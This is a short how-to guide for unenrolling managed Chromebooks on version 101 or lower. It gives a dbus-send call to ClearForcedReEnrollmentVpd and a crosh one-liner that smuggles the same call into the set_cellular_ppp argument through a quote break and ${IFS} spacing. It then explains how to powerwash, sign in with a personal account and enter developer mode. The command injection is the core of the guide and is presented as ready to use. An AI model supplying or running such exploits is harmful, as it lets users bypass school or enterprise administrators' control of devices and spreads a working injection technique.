:::note
This relies on you being under version 102. See [Kernel Versions](/kajigs/kernverinfo).
:::

# Requirements:
- crosh access
- version 101 or lower

# Guide
run this as chronos
```
dbus-send --system --print-reply --dest=org.chromium.SessionManager /org/chromium/SessionManager org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd
```
or a funny one-liner for crosh:
```
set_cellular_ppp \';dbus-send${IFS}--system${IFS}--print-reply${IFS}--dest=org.chromium.SessionManager${IFS}/org/chromium/SessionManager${IFS}org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd;exit;\'
```

If successful, the command will return `method return` and some other data after that. Powerwash your chromebook and log in with a personal email. On devices without FWMP, you will also have the option to enter developer mode immediately.
